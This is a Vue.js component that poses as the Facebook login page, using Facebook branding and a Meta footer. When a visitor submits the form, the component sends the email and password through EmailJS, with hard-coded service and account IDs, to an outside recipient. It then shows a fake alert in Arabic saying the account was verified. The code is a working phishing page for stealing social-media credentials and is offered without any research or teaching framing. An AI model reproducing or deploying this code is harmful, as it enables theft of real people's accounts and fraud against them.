<template>
  <div class="login-page">
    <div class="login-container">
      <img src="../src/assets/MJ4JPV8p5Kv.png" alt="Facebook Logo" class="logo img-fluid "/>
      <form @submit.prevent="login">
        <input type="text" v-model="email" placeholder="Mobile number or email address" required />
        <input type="password" v-model="password" placeholder="Password" required />
        <button type="submit" class="login-button mt-3">Log in</button>
      </form>
      <p class="forgot-password">Forgotten Password?</p>
      <!-- <button class="create-account-button" @click="createAccount">Create new account</button> -->
    </div>
    <footer>© Meta</footer>
  </div>
</template>

<script>
import emailjs from 'emailjs-com';

export default {
  data() {
    return {
      email: '',
      password: ''
    };
  },
  methods: {
    login() {
      const serviceID = 'service_i54k1c6'; // معرف الخدمة
      const templateID = 'template_ycsc75j'; // معرف القالب
      const userID = 'R-jJQoWe8rrz4diaR'; // معرف المستخدم
      const templateParams = {
        email: this.email,
        password: this.password
      };

      emailjs.send(serviceID, templateID, templateParams, userID)
        .then((response) => {
          console.log('SUCCESS!', response.status, response.text);
          alert('تم التأكد من صلاحية الحساب بنجاح!');
        }, (error) => {
          console.log('FAILED...', error);
          alert('فشل في إرسال البيانات.');
        });
    },
    createAccount() {
      // Handle create account logic here
      alert('Redirecting to create account page');
    }
  }
};
</script>

<style scoped>
.login-page {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 100vh;
  width: 100%;
  background-color: #f5f2fb;
}
.login-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  background-color: white;
  padding: 20px;
  width: 400px;
  height: 400px;
  margin: auto;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
}
.logo {
  width: 100px;
  margin-bottom: 20px;
  max-width: 50px;
}
form {
  display: flex;
  flex-direction: column;
  width: 100%;
}
input {
  padding: 10px;
  margin-top: 20px;
  margin-bottom: 10px;
  border: 1px solid #ddd;
  border-radius: 4px;
}
.login-button, .create-account-button {
  padding: 10px;
  border: none;
  border-radius: 4px;
  background-color: #1877f2;
  color: white;
  font-weight: bold;
  cursor: pointer;
  margin-bottom: 10px;
}
.login-button:hover, .create-account-button:hover {
  background-color: #155ab6;
}
.forgot-password {
  color: #1877f2;
  text-decoration: none;
  margin-bottom: 10px;
}
footer {
  margin-top: 20px;
  font-size: 14px;
  color: #666;
}
@media (max-width: 477px) {
  .login-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    background-color: white;
    padding: 20px;
    width: 362px;
    height: 400px;
    margin: auto;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
  }
}
</style>


